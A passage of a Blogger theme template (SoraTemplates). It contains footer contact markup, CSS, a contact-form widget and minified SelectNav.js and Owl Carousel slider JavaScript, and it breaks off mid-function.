                                        &lt;p class=&quot;phone&quot;&gt;&lt;label&gt;phone:&lt;/label&gt;&lt;span class=&quot;ft-content phone-num&quot;&gt;&lt;span class=&quot;phone1&quot;&gt;+91-8712725068, &lt;/span&gt;&lt;span class=&quot;phone2&quot;&gt;+91-8712725068&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
                                        &lt;p class=&quot;web&quot;&gt;&lt;label&gt;email:&lt;/label&gt;&lt;span class=&quot;ft-content web-site&quot;&gt;&lt;a href=&quot;mailto:click2chor@gmail.com&quot;&gt;click2chor@gmail.com&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
                                    &lt;/div&gt;
&lt;style&gt;
.footer-contact {
    background: url(https://1.bp.blogspot.com/-KrRLPRU4Yyc/WVeIzm_sWPI/AAAAAAAADKM/4j_DZrc5PNc44x5NXAJzawHBgrckZ3FDgCLcBGAs/s1600/bg.png) no-repeat scroll center center;
}
.footer-contact p {
    clear: both;
    color: #fff;
    overflow: hidden;
    font-size: 14px;
    font-weight: normal;
    line-height: 22px;
}
.footer-contact p {
    margin-bottom: 13px;
    padding-bottom: 13px;
    border-bottom: 1px solid #999;
    text-transform: capitalize;
}
.footer-contact label {
    color: #fff;
    float: left;
    font-size: 14px;
    font-weight: normal;
    margin-right: 20px;
    max-width: 80px;
    min-width: 80px;
    text-transform: capitalize;
    display: inline-block;
}
.footer-contact:last-child p.web {
    border: medium none;
    margin: 0;
    padding: 0;
}
.footer-contact p a {
    color: #fa5555;
}
&lt;/style&gt;</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
  </b:widget>
  <b:widget id='ContactForm1' locked='false' title='Contact Form' type='ContactForm'>
    <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='contact-form-widget'>
    <div class='form'>
      <form name='contact-form'>
        <p/>
        <data:contactFormNameMsg/>
        <br/>
        <input class='contact-form-name' expr:id='data:widget.instanceId + &quot;_contact-form-name&quot;' name='name' size='30' type='text' value=''/>
        <p/>
        <data:contactFormEmailMsg/> <span style='font-weight: bolder;'>*</span>
        <br/>
        <input class='contact-form-email' expr:id='data:widget.instanceId + &quot;_contact-form-email&quot;' name='email' size='30' type='text' value=''/>
        <p/>
        <data:contactFormMessageMsg/> <span style='font-weight: bolder;'>*</span>
        <br/>
        <textarea class='contact-form-email-message' cols='25' expr:id='data:widget.instanceId + &quot;_contact-form-email-message&quot;' name='email-message' rows='5'/>
        <p/>
        <input class='contact-form-button contact-form-button-submit' expr:id='data:widget.instanceId + &quot;_contact-form-submit&quot;' expr:value='data:contactFormSendMsg' type='button'/>
        <p/>
        <div style='text-align: center; max-width: 222px; width: 100%'>
          <p class='contact-form-error-message' expr:id='data:widget.instanceId + &quot;_contact-form-error-message&quot;'/>
          <p class='contact-form-success-message' expr:id='data:widget.instanceId + &quot;_contact-form-success-message&quot;'/>
        </div>
      </form>
    </div>
  </div>
  <b:include name='quickedit'/>
</b:includable>
  </b:widget>
</b:section>
</div>
<div style='clear: both;'/>
</div>
</div>
<div id='ty_footer'>
        <div class='ty-copy-container row'>
         
                    <div class='ty_footer_copyright'>
                      Created By <a href='http://soratemplates.com/' id='mycontent' rel='dofollow' title='Free Blogger Templates'>SoraTemplates</a> | Distributed By <a href='http://mybloggerthemes.com/' rel='dofollow' style='color:#fa5555;' target='_blank'>MyBloggerThemes</a></div>
<div class='ty_footer_bank_image'>
																		<img alt='Payment Image' class='responsive-img' src='http://1.bp.blogspot.com/-_qcunSRk2Zk/WVaCkjCiZQI/AAAAAAAADJ0/v66UjreeKSABZEYqsq0DDeOnYNYxn7GMQCK4BGAYYCw/s1600/payments.png'/>
													
									</div>
        </div>
    </div>


&lt;/div&gt;

<script async='async' type='text/javascript'> 
//<![CDATA[
var no_image = "http://3.bp.blogspot.com/-Yw8BIuvwoSQ/VsjkCIMoltI/AAAAAAAAC4c/s55PW6xEKn0/s1600-r/nth.png";
var month_format = [, "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sept", "Oct", "Nov", "Dec"];
var related_number = 3;
var more_text = "View More";
var comments_text = "<span>Post </span>Comment";
var POSTPAGER_OLDER = "Older Article"; // post nav text "previous post"
var POSTPAGER_NEWER = "Newer Article"; // post nav text "next post"
//]]>
</script>
<script type='text/javascript'>
//<![CDATA[

// SelectNav.js - by: https://github.com/lukaszfiszer/selectnav.js
window.selectnav=function(){"use strict";var e=function(e,t){function c(e){var t;if(!e)e=window.event;if(e.target)t=e.target;else if(e.srcElement)t=e.srcElement;if(t.nodeType===3)t=t.parentNode;if(t.value)window.location.href=t.value}function h(e){var t=e.nodeName.toLowerCase();return t==="ul"||t==="ol"}function p(e){for(var t=1;document.getElementById("selectnav"+t);t++);return e?"selectnav"+t:"selectnav"+(t-1)}function d(e){a++;var t=e.children.length,n="",l="",c=a-1;if(!t){return}if(c){while(c--){l+=o}l+=" "}for(var v=0;v<t;v++){var m=e.children[v].children[0];if(typeof m!=="undefined"){var g=m.innerText||m.textContent;var y="";if(r){y=m.className.search(r)!==-1||m.parentNode.className.search(r)!==-1?f:""}if(i&&!y){y=m.href===document.URL?f:""}n+='<option value="'+m.href+'" '+y+">"+l+g+"</option>";if(s){var b=e.children[v].children[1];if(b&&h(b)){n+=d(b)}}}}if(a===1&&u){n='<option value="">'+u+"</option>"+n}if(a===1){n='<select class="selectnav" id="'+p(true)+'">'+n+"</select>"}a--;return n}e=document.getElementById(e);if(!e){return}if(!h(e)){return}if(!("insertAdjacentHTML"in window.document.documentElement)){return}document.documentElement.className+=" js";var n=t||{},r=n.activeclass||"active",i=typeof n.autoselect==="boolean"?n.autoselect:true,s=typeof n.nested==="boolean"?n.nested:true,o=n.indent||"-",u=n.label||"Menu",a=0,f=" selected ";e.insertAdjacentHTML("afterend",d(e));var l=document.getElementById(p());if(l.addEventListener){l.addEventListener("change",c)}if(l.attachEvent){l.attachEvent("onchange",c)}return l};return function(t,n){e(t,n)}}();$(document).ready(function(){selectnav('nav');});

// Plugin: jQuery owl Slider v2.2 
;(function($,window,document,undefined){function Owl(element,options){this.settings=null;this.options=$.extend({},Owl.Defaults,options);this.$element=$(element);this._handlers={};this._plugins={};this._supress={};this._current=null;this._speed=null;this._coordinates=[];this._breakpoint=null;this._width=null;this._items=[];this._clones=[];this._mergers=[];this._widths=[];this._invalidated={};this._pipe=[];this._drag={time:null,target:null,pointer:null,stage:{start:null,current:null},direction:null};this._states={current:{},tags:{'initializing':['busy'],'animating':['busy'],'dragging':['interacting']}};$.each(['onResize','onThrottledResize'],$.proxy(function(i,handler){this._handlers[handler]=$.proxy(this[handler],this);},this));$.each(Owl.Plugins,$.proxy(function(key,plugin){this._plugins[key.charAt(0).toLowerCase()+key.slice(1)]=new plugin(this);},this));$.each(Owl.Workers,$.proxy(function(priority,worker){this._pipe.push({'filter':worker.filter,'run':$.proxy(worker.run,this)});},this));this.setup();this.initialize();}
Owl.Defaults={items:3,loop:false,center:false,rewind:false,mouseDrag:true,touchDrag:true,pullDrag:true,freeDrag:false,margin:0,stagePadding:0,merge:false,mergeFit:true,autoWidth:false,startPosition:0,rtl:false,smartSpeed:250,fluidSpeed:false,dragEndSpeed:false,responsive:{},responsiveRefreshRate:200,responsiveBaseElement:window,fallbackEasing:'swing',info:false,nestedItemSelector:false,itemElement:'div',stageElement:'div',refreshClass:'owl-refresh',loadedClass:'owl-loaded',loadingClass:'owl-loading',rtlClass:'owl-rtl',responsiveClass:'owl-responsive',dragClass:'owl-drag',itemClass:'owl-item',stageClass:'owl-stage',stageOuterClass:'owl-stage-outer',grabClass:'owl-grab'};Owl.Width={Default:'default',Inner:'inner',Outer:'outer'};Owl.Type={Event:'event',State:'state'};Owl.Plugins={};Owl.Workers=[{filter:['width','settings'],run:function(){this._width=this.$element.width();}},{filter:['width','items','settings'],run:function(cache){cache.current=this._items&&this._items[this.relative(this._current)];}},{filter:['items','settings'],run:function(){this.$stage.children('.cloned').remove();}},{filter:['width','items','settings'],run:function(cache){var margin=this.settings.margin||'',grid=!this.settings.autoWidth,rtl=this.settings.rtl,css={'width':'auto','margin-left':rtl?margin:'','margin-right':rtl?'':margin};!grid&&this.$stage.children().css(css);cache.css=css;}},{filter:['width','items','settings'],run:function(cache){var width=(this.width()/ this.settings.items).toFixed(3)-this.settings.margin,merge=null,iterator=this._items.length,grid=!this.settings.autoWidth,widths=[];cache.items={merge:false,width:width};while(iterator--){merge=this._mergers[iterator];merge=this.settings.mergeFit&&Math.min(merge,this.settings.items)||merge;cache.items.merge=merge>1||cache.items.merge;widths[iterator]=!grid?this._items[iterator].width():width*merge;}
this._widths=widths;}},{filter:['items','settings'],run:function(){var clones=[],items=this._items,settings=this.settings,view=Math.max(settings.items*2,4),size=Math.ceil(items.length / 2)*2,repeat=settings.loop&&items.length?settings.rewind?view:Math.max(view,size):0,append='',prepend='';repeat /=2;while(repeat--){clones.push(this.normalize(clones.length / 2,true));append=append+items[clones[clones.length-1]][0].outerHTML;clones.push(this.normalize(items.length-1-(clones.length-1)/ 2,true));prepend=items[clones[clones.length-1]][0].outerHTML+prepend;}
this._clones=clones;$(append).addClass('cloned').appendTo(this.$stage);$(prepend).addClass('cloned').prependTo(this.$stage);}},{filter:['width','items','settings'],run:function(){var rtl=this.settings.rtl?1:-1,size=this._clones.length+this._items.length,iterator=-1,previous=0,current=0,coordinates=[];while(++iterator<size){previous=coordinates[iterator-1]||0;current=this._widths[this.relative(iterator)]+this.settings.margin;coordinates.push(previous+current*rtl);}
this._coordinates=coordinates;}},{filter:['width','items','settings'],run:function(){var padding=this.settings.stagePadding,coordinates=this._coordinates,css={'width':Math.ceil(Math.abs(coordinates[coordinates.length-1]))+padding*2,'padding-left':padding||'','padding-right':padding||''};this.$stage.css(css);}},{filter:['width','items','settings'],run:function(cache){var iterator=this._coordinates.length,grid=!this.settings.autoWidth,items=this.$stage.children();if(grid&&cache.items.merge){while(iterator--){cache.css.width=this._widths[this.relative(iterator)];items.eq(iterator).css(cache.css);}}else if(grid){cache.css.width=cache.items.width;items.css(cache.css);}}},{filter:['items'],run:function(){this._coordinates.length<1&&this.$stage.removeAttr('style');}},{filter:['width','items','settings'],run:function(cache){cache.current=cache.current?this.$stage.children().index(cache.current):0;cache.current=Math.max(this.minimum(),Math.min(this.maximum(),cache.current));this.reset(cache.current);}},{filter:['position'],run:function(){this.animate(this.coordinates(this._current));}},{filter:['width','position','items','settings'],run:function(){var rtl=this.settings.rtl?1:-1,padding=this.settings.stagePadding*2,begin=this.coordinates(this.current())+padding,end=begin+this.width()*rtl,inner,outer,matches=[],i,n;for(i=0,n=this._coordinates.length;i<n;i++){inner=this._coordinates[i-1]||0;outer=Math.abs(this._coordinates[i])+padding*rtl;if((this.op(inner,'<=',begin)&&(this.op(inner,'>',end)))||(this.op(outer,'<',begin)&&this.op(outer,'>',end))){matches.push(i);}}
this.$stage.children('.active').removeClass('active');this.$stage.children(':eq('+matches.join('), :eq(')+')').addClass('active');if(this.settings.center){this.$stage.children('.center').removeClass('center');this.$stage.children().eq(this.current()).addClass('center');}}}];Owl.prototype.initialize=function(){this.enter('initializing');this.trigger('initialize');this.$element.toggleClass(this.settings.rtlClass,this.settings.rtl);if(this.settings.autoWidth&&!this.is('pre-loading')){var imgs,nestedSelector,width;imgs=this.$element.find('img');nestedSelector=this.settings.nestedItemSelector?'.'+this.settings.nestedItemSelector:undefined;width=this.$element.children(nestedSelector).width();if(imgs.length&&width<=0){this.preloadAutoWidthImages(imgs);}}
this.$element.addClass(this.options.loadingClass);this.$stage=$('<'+this.settings.stageElement+' class="'+this.settings.stageClass+'"/>').wrap('<div class="'+this.settings.stageOuterClass+'"/>');this.$element.append(this.$stage.parent());this.replace(this.$element.children().not(this.$stage.parent()));if(this.$element.is(':visible')){this.refresh();}else{this.invalidate('width');}
this.$element.removeClass(this.options.loadingClass).addClass(this.options.loadedClass);this.registerEventHandlers();this.leave('initializing');this.trigger('initialized');};Owl.prototype.setup=function(){var viewport=this.viewport(),overwrites=this.options.responsive,match=-1,settings=null;if(!overwrites){settings=$.extend({},this.options);}else{$.each(overwrites,function(breakpoint){if(breakpoint<=viewport&&breakpoint>match){match=Number(breakpoint);}});settings=$.extend({},this.options,overwrites[match]);if(typeof settings.stagePadding==='function'){settings.stagePadding=settings.stagePadding();}
delete settings.responsive;if(settings.responsiveClass){this.$element.attr('class',this.$element.attr('class').replace(new RegExp('('+this.options.responsiveClass+'-)\\S+\\s','g'),'$1'+match));}}
this.trigger('change',{property:{name:'settings',value:settings}});this._breakpoint=match;this.settings=settings;this.invalidate('settings');this.trigger('changed',{property:{name:'settings',value:this.settings}});};Owl.prototype.optionsLogic=function(){if(this.settings.autoWidth){this.settings.stagePadding=false;this.settings.merge=false;}};Owl.prototype.prepare=function(item){var event=this.trigger('prepare',{content:item});if(!event.data){event.data=$('<'+this.settings.itemElement+'/>').addClass(this.options.itemClass).append(item)}
this.trigger('prepared',{content:event.data});return event.data;};Owl.prototype.update=function(){var i=0,n=this._pipe.length,filter=$.proxy(function(p){return this[p]},this._invalidated),cache={};while(i<n){if(this._invalidated.all||$.grep(this._pipe[i].filter,filter).length>0){this._pipe[i].run(cache);}
i++;}
this._invalidated={};!this.is('valid')&&this.enter('valid');};Owl.prototype.width=function(dimension){dimension=dimension||Owl.Width.Default;switch(dimension){case Owl.Width.Inner:case Owl.Width.Outer:return this._width;default:return this._width-this.settings.stagePadding*2+this.settings.margin;}};Owl.prototype.refresh=function(){this.enter('refreshing');this.trigger('refresh');this.setup();this.optionsLogic();this.$element.addClass(this.options.refreshClass);this.update();this.$element.removeClass(this.options.refreshClass);this.leave('refreshing');this.trigger('refreshed');};Owl.prototype.onThrottledResize=function(){window.clearTimeout(this.resizeTimer);this.resizeTimer=window.setTimeout(this._handlers.onResize,this.settings.responsiveRefreshRate);};Owl.prototype.onResize=function(){if(!this._items.length){return false;}
if(this._width===this.$element.width()){return false;}
if(!this.$element.is(':visible')){return false;}
this.enter('resizing');if(this.trigger('resize').isDefaultPrevented()){this.leave('resizing');return false;}
this.invalidate('width');this.refresh();this.leave('resizing');this.trigger('resized');};Owl.prototype.registerEventHandlers=function(){if($.support.transition){this.$stage.on($.support.transition.end+'.owl.core',$.proxy(this.onTransitionEnd,this));}
if(this.settings.responsive!==false){this.on(window,'resize',this._handlers.onThrottledResize);}
if(this.settings.mouseDrag){this.$element.addClass(this.options.dragClass);this.$stage.on('mousedown.owl.core',$.proxy(this.onDragStart,this));this.$stage.on('dragstart.owl.core selectstart.owl.core',function(){return false});}
if(this.settings.touchDrag){this.$stage.on('touchstart.owl.core',$.proxy(this.onDragStart,this));this.$stage.on('touchcancel.owl.core',$.proxy(this.onDragEnd,this));}};Owl.prototype.onDragStart=function(event){var stage=null;if(event.which===3){return;}
if($.support.transform){stage=this.$stage.css('transform').replace(/.*\(|\)| /g,'').split(',');stage={x:stage[stage.length===16?12:4],y:stage[stage.length===16?13:5]};}else{stage=this.$stage.position();stage={x:this.settings.rtl?stage.left+this.$stage.width()-this.width()+this.settings.margin:stage.left,y:stage.top};}
if(this.is('animating')){$.support.transform?this.animate(stage.x):this.$stage.stop()
this.invalidate('position');}
this.$element.toggleClass(this.options.grabClass,event.type==='mousedown');this.speed(0);this._drag.time=new Date().getTime();this._drag.target=$(event.target);this._drag.stage.start=stage;this._drag.stage.current=stage;this._drag.pointer=this.pointer(event);$(document).on('mouseup.owl.core touchend.owl.core',$.proxy(this.onDragEnd,this));$(document).one('mousemove.owl.core touchmove.owl.core',$.proxy(function(event){var delta=this.difference(this._drag.pointer,this.pointer(event));$(document).on('mousemove.owl.core touchmove.owl.core',$.proxy(this.onDragMove,this));if(Math.abs(delta.x)<Math.abs(delta.y)&&this.is('valid')){return;}
event.preventDefault();this.enter('dragging');this.trigger('drag');},this));};Owl.prototype.onDragMove=function(event){var minimum=null,maximum=null,pull=null,delta=this.difference(this._drag.pointer,this.pointer(event)),stage=this.difference(this._drag.stage.start,delta);if(!this.is('dragging')){return;}
event.preventDefault();if(this.settings.loop){minimum=this.coordinates(this.minimum());maximum=this.coordinates(this.maximum()+1)-minimum;stage.x=(((stage.x-minimum)%maximum+maximum)%maximum)+minimum;}else{minimum=this.settings.rtl?this.coordinates(this.maximum()):this.coordinates(this.minimum());maximum=this.settings.rtl?this.coordinates(this.minimum()):this.coordinates(this.maximum());pull=this.settings.pullDrag?-1*delta.x / 5:0;stage.x=Math.max(Math.min(stage.x,minimum+pull),maximum+pull);}
this._drag.stage.current=stage;this.animate(stage.x);};Owl.prototype.onDragEnd=function(event){var delta=this.difference(this._drag.pointer,this.pointer(event)),stage=this._drag.stage.current,direction=delta.x>0^this.settings.rtl?'left':'right';$(document).off('.owl.core');this.$element.removeClass(this.options.grabClass);if(delta.x!==0&&this.is('dragging')||!this.is('valid')){this.speed(this.settings.dragEndSpeed||this.settings.smartSpeed);this.current(this.closest(stage.x,delta.x!==0?direction:this._drag.direction));this.invalidate('position');this.update();this._drag.direction=direction;if(Math.abs(delta.x)>3||new Date().getTime()-this._drag.time>300){this._drag.target.one('click.owl.core',function(){return false;});}}
if(!this.is('dragging')){return;}
this.leave('dragging');this.trigger('dragged');};Owl.prototype.closest=function(coordinate,direction){var position=-1,pull=30,width=this.width(),coordinates=this.coordinates();if(!this.settings.freeDrag){$.each(coordinates,$.proxy(function(index,value){if(direction==='left'&&coordinate>value-pull&&coordinate<value+pull){position=index;}else if(direction==='right'&&coordinate>value-width-pull&&coordinate<value-width+pull){position=index+1;}else if(this.op(coordinate,'<',value)&&this.op(coordinate,'>',coordinates[index+1]||value-width)){position=direction==='left'?index+1:index;}
return position===-1;},this));}
if(!this.settings.loop){if(this.op(coordinate,'>',coordinates[this.minimum()])){position=coordinate=this.minimum();}else if(this.op(coordinate,'<',coordinates[this.maximum()])){position=coordinate=this.maximum();}}
return position;};Owl.prototype.animate=function(coordinate){var animate=this.speed()>0;this.is('animating')&&this.onTransitionEnd();if(animate){this.enter('animating');this.trigger('translate');}
if($.support.transform3d&&$.support.transition){this.$stage.css({transform:'translate3d('+coordinate+'px,0px,0px)',transition:(this.speed()/ 1000)+'s'});}else if(animate){this.$stage.animate({left:coordinate+'px'},this.speed(),this.settings.fallbackEasing,$.proxy(this.onTransitionEnd,this));}else{this.$stage.css({left:coordinate+'px'});}};Owl.prototype.is=function(state){return this._states.current[state]&&this._states.current[state]>0;};Owl.prototype.current=function(position){if(position===undefined){return this._current;}
if(this._items.length===0){return undefined;}
position=this.normalize(position);if(this._current!==position){var event=this.trigger('change',{property:{name:'position',value:position}});if(event.data!==undefined){position=this.normalize(event.data);}
this._current=position;this.invalidate('position');this.trigger('changed',{property:{name:'position',value:this._current}});}
return this._current;};Owl.prototype.invalidate=function(part){if($.type(part)==='string'){this._invalidated[part]=true;this.is('valid')&&this.leave('valid');}
return $.map(this._invalidated,function(v,i){return i});};Owl.prototype.reset=function(position){position=this.normalize(position);if(position===undefined){return;}
this._speed=0;this._current=position;this.suppress(['translate','translated']);this.animate(this.coordinates(position));this.release(['translate','translated']);};Owl.prototype.normalize=function(position,relative){var n=this._items.length,m=relative?0:this._clones.length;if(!this.isNumeric(position)||n<1){position=undefined;}else if(position<0||position>=n+m){position=((position-m / 2)%n+n)%n+m / 2;}
return position;};Owl.prototype.relative=function(position){position-=this._clones.length / 2;return this.normalize(position,true);};Owl.prototype.maximum=function(relative){var settings=this.settings,maximum=this._coordinates.length,iterator,reciprocalItemsWidth,elementWidth;if(settings.loop){maximum=this._clones.length / 2+this._items.length-1;}else if(settings.autoWidth||settings.merge){iterator=this._items.length;reciprocalItemsWidth=this._items[--iterator].width();elementWidth=this.$element.width();while(iterator--){reciprocalItemsWidth+=this._items[iterator].width()+this.settings.margin;if(reciprocalItemsWidth>elementWidth){break;}}
maximum=iterator+1;}else if(settings.center){maximum=this._items.length-1;}else{maximum=this._items.length-settings.items;}
if(relative){maximum-=this._clones.length / 2;}
return Math.max(maximum,0);};Owl.prototype.minimum=function(relative){return relative?0:this._clones.length / 2;};Owl.prototype.items=function(position){if(position===undefined){return this._items.slice();}
position=this.normalize(position,true);return this._items[position];};Owl.prototype.mergers=function(position){if(position===undefined){return this._mergers.slice();}
position=this.normalize(position,true);return this._mergers[position];};Owl.prototype.clones=function(position){var odd=this._clones.length / 2,even=odd+this._items.length,map=function(index){return index%2===0?even+index / 2:odd-(index+1)/ 2};if(position===undefined){return $.map(this._clones,function(v,i){return map(i)});}
return $.map(this._clones,function(v,i){return v===position?map(i):null});};Owl.prototype.speed=function(speed){if(speed!==undefined){this._speed=speed;}
return this._speed;};Owl.prototype.coordinates=function(position){var multiplier=1,newPosition=position-1,coordinate;if(position===undefined){return $.map(this._coordinates,$.proxy(function(coordinate,index){return this.coordinates(index);},this));}
if(this.settings.center){if(this.settings.rtl){multiplier=-1;newPosition=position+1;}
coordinate=this._coordinates[position];coordinate+=(this.width()-coordinate+(this._coordinates[newPosition]||0))/ 2*multiplier;}else{coordinate=this._coordinates[newPosition]||0;}
coordinate=Math.ceil(coordinate);return coordinate;};Owl.prototype.duration=function(from,to,factor){if(factor===0){return 0;}
return Math.min(Math.max(Math.abs(to-from),1),6)*Math.abs((factor||this.settings.smartSpeed));};Owl.prototype.to=function(position,speed){var current=this.current(),revert=null,distance=position-this.relative(current),direction=(distance>0)-(distance<0),items=this._items.length,minimum=this.minimum(),maximum=this.maximum();if(this.settings.loop){if(!this.settings.rewind&&Math.abs(distance)>items / 2){distance+=direction*-1*items;}
position=current+distance;revert=((position-minimum)%items+items)%items+minimum;if(revert!==position&&revert-distance<=maximum&&revert-distance>0){current=revert-distance;position=revert;this.reset(current);}}else if(this.settings.rewind){maximum+=1;position=(position%maximum+maximum)%maximum;}else{position=Math.max(minimum,Math.min(maximum,position));}
this.speed(this.duration(current,position,speed));this.current(position);if(this.$element.is(':visible')){this.update();}};Owl.prototype.next=function(speed){speed=speed||false;this.to(this.relative(this.current())+1,speed);};Owl.prototype.prev=function(speed){speed=speed||false;this.to(this.relative(this.current())-1,speed);};Owl.prototype.onTransitionEnd=function(event){if(event!==undefined){event.stopPropagation();if((event.target||event.srcElement||event.originalTarget)!==this.$stage.get(0)){return false;}}
this.leave('animating');this.trigger('translated');};Owl.prototype.viewport=function(){var width;if(this.options.responsiveBaseElement!==window){width=$(this.options.responsiveBaseElement).width();}else if(window.innerWidth){width=window.innerWidth;}else if(document.documentElement&&document.documentElement.clientWidth){width=document.documentElement.clientWidth;}else{console.warn('Can not detect viewport width.');}
return width;};Owl.prototype.replace=function(content){this.$stage.empty();this._items=[];if(content){content=(content instanceof jQuery)?content:$(content);}
if(this.settings.nestedItemSelector){content=content.find('.'+this.settings.nestedItemSelector);}
content.filter(function(){return this.nodeType===1;}).each($.proxy(function(index,item){item=this.prepare(item);this.$stage.append(item);this._items.push(item);this._mergers.push(item.find('[data-merge]').addBack('[data-merge]').attr('data-merge')*1||1);},this));this.reset(this.isNumeric(this.settings.startPosition)?this.settings.startPosition:0);this.invalidate('items');};Owl.prototype.add=function(content,position){var current=this.relative(this._current);position=position===undefined?this._items.length:this.normalize(position,true);content=content instanceof jQuery?content:$(content);this.trigger('add',{content:content,position:position});content=this.prepare(content);if(this._items.length===0||position===this._items.length){this._items.length===0&&this.$stage.append(content);this._items.length!==0&&this._items[position-1].after(content);this._items.push(content);this._mergers.push(content.find('[data-merge]').addBack('[data-merge]').attr('data-merge')*1||1);}else{this._items[position].before(content);this._items.splice(position,0,content);this._mergers.splice(position,0,content.find('[data-merge]').addBack('[data-merge]').attr('data-merge')*1||1);}
this._items[current]&&this.reset(this._items[current].index());this.invalidate('items');this.trigger('added',{content:content,position:position});};Owl.prototype.remove=function(position){position=this.normalize(position,true);if(position===undefined){return;}
this.trigger('remove',{content:this._items[position],position:position});this._items[position].remove();this._items.splice(position,1);this._mergers.splice(position,1);this.invalidate('items');this.trigger('removed',{content:null,position:position});};Owl.prototype.preloadAutoWidthImages=function(images){images.each($.proxy(function(i,element){this.enter('pre-loading');element=$(element);$(new Image()).one('load',$.proxy(function(e){element.attr('src',e.target.src);element.css('opacity',1);this.leave('pre-loading');!this.is('pre-loading')&&!this.is('initializing')&&this.refresh();},this)).attr('src',element.attr('src')||element.attr('data-src')||element.attr('data-src-retina'));},this));};Owl.prototype.destroy=function(){this.$element.off('.owl.core');this.$stage.off('.owl.core');$(document).off('.owl.core');if(this.settings.responsive!==false){window.clearTimeout(this.resizeTimer);this.off(window,'resize',this._handlers.onThrottledResize);}
for(var i in this._plugins){this._plugins[i].destroy();}
this.$stage.children('.cloned').remove();this.$stage.unwrap();this.$stage.children().contents().unwrap();this.$stage.children().unwrap();this.$element.removeClass(this.options.refreshClass).removeClass(this.options.loadingClass).removeClass(this.options.loadedClass).removeClass(this.options.rtlClass).removeClass(this.options.dragClass).removeClass(this.options.grabClass).attr('class',this.$element.attr('class').replace(new RegExp(this.options.responsiveClass+'-\\S+\\s','g'),'')).removeData('owl.carousel');};Owl.prototype.op=function(a,o,b){var rtl=this.settings.rtl;switch(o){case'<':return rtl?a>b:a<b;case'>':return rtl?a<b:a>b;case'>=':return rtl?a<=b:a>=b;case'<=':return rtl?a>=b:a<=b;default:break;}};Owl.prototype.on=function(element,event,listener,capture){if(element.addEventListener){element.addEventListener(event,listener,capture);}else if(element.attachEvent){element.attachEvent('on'+event,listener);}};Owl.prototype.off=function(element,event,listener,capture){if(element.removeEventListener){element.removeEventListener(event,listener,capture);}else if(element.detachEvent){element.detachEvent('on'+event,listener);}};Owl.prototype.trigger=function(name,data,namespace,state,enter){var status={item:{count:this._items.length,index:this.current()}},handler=$.camelCase($.grep(['on',name,namespace],function(v){return v}).join('-').toLowerCase()),event=$.Event([name,'owl',namespace||'carousel'].join('.').toLowerCase(),$.extend({relatedTarget:this},status,data));if(!this._supress[name]){$.each(this._plugins,function(name,plugin){if(plugin.onTrigger){plugin.onTrigger(event);}});this.register({type:Owl.Type.Event,name:name});this.$element.trigger(event);if(this.settings&&typeof this.settings[handler]==='function'){this.settings[handler].call(this,event);}}
return event;};Owl.prototype.enter=function(name){$.each([name].concat(this._states.tags[name]||[]),$.proxy(function(i,name){if(this._states.current[name]===undefined){this._states.current[name]=0;}
this._states.current[name]++;},this));};Owl.prototype.leave=function(name){$.each([name].concat(this._states.tags[name]||[]),$.proxy(function(i,name){this._states.current[name]--;},this));};Owl.prototype.register=function(object){if(object.type===Owl.Type.Event){if(!$.event.special[object.name]){$.event.special[object.name]={};}
if(!$.event.special[object.name].owl){var _default=$.event.special[object.name]._default;$.event.special[object.name]._default=function(e){if(_default&&_default.apply&&(!e.namespace||e.namespace.indexOf('owl')===-1)){return _default.apply(this,arguments);}
return e.namespace&&e.namespace.indexOf('owl')>-1;};$.event.special[object.name].owl=true;}}else if(object.type===Owl.Type.State){if(!this._states.tags[object.name]){this._states.tags[object.name]=object.tags;}else{this._states.tags[object.name]=this._states.tags[object.name].concat(object.tags);}
this._states.tags[object.name]=$.grep(this._states.tags[object.name],$.proxy(function(tag,i){return $.inArray(tag,this._states.tags[object.name])===i;},this));}};Owl.prototype.suppress=function(events){$.each(events,$.proxy(function(index,event){this._supress[event]=true;},this));};Owl.prototype.release=function(events){$.each(events,$.proxy(function(index,event){delete this._supress[event];},this));};Owl.prototype.pointer=function(event){var result={x:null,y:null};event=event.originalEvent||event||window.event;event=event.touches&&event.touches.length?event.touches[0]:event.changedTouches&&event.changedTouches.length?event.changedTouches[0]:event;if(event.pageX){result.x=event.pageX;result.y=event.pageY;}else{result.x=event.clientX;result.y=event.clientY;}
return result;};Owl.prototype.isNumeric=function(number){return!isNaN(parseFloat(number));};Owl.prototype.difference=function(first,second){return{x:first.x-second.x,y:first.y-second.y};};$.fn.owlCarousel=function(option){var args=Array.prototype.slice.call(arguments,1);return this.each(function(){var $this=$(this),data=$this.data('owl.carousel');if(!data){data=new Owl(this,typeof option=='object'&&option);$this.data('owl.carousel',data);$.each(['next','prev','to','destroy','refresh','replace','add','remove'],function(i,event){data.register({type:Owl.Type.Event,name:event});data.$element.on(event+'.owl.carousel.core',$.proxy(function(e){if(e.namespace&&e.relatedTarget!==this){this.suppress([event]);data[event].apply(this,[].slice.call(arguments,1));this.release([event]);}},data));});}
if(typeof option=='string'&&option.charAt(0)!=='_'){data[option].apply(data,args);}});};$.fn.owlCarousel.Constructor=Owl;})(window.Zepto||window.jQuery,window,document);;(function($,window,document,undefined){var AutoRefresh=function(carousel){this._core=carousel;this._interval=null;this._visible=null;this._handlers={'initialized.owl.carousel':$.proxy(function(e){if(e.namespace&&this._core.settings.autoRefresh){this.watch();}},this)};this._core.options=$.extend({},AutoRefresh.Defaults,this._core.options);this._core.$element.on(this._handlers);};AutoRefresh.Defaults={autoRefresh:true,autoRefreshInterval:500};AutoRefresh.prototype.watch=function(){if(this._interval){return;}
this._visible=this._core.$element.is(':visible');this._interval=window.setInterval($.proxy(this.refresh,this),this._core.settings.autoRefreshInterval);};AutoRefresh.prototype.refresh=function(){if(this._core.$element.is(':visible')===this._visible){return;}
this._visible=!this._visible;this._core.$element.toggleClass('owl-hidden',!this._visible);this._visible&&(this._core.invalidate('width')&&this._core.refresh());};AutoRefresh.prototype.destroy=function(){var handler,property;window.clearInterval(this._interval);for(handler in this._handlers){this._core.$element.off(handler,this._handlers[handler]);}
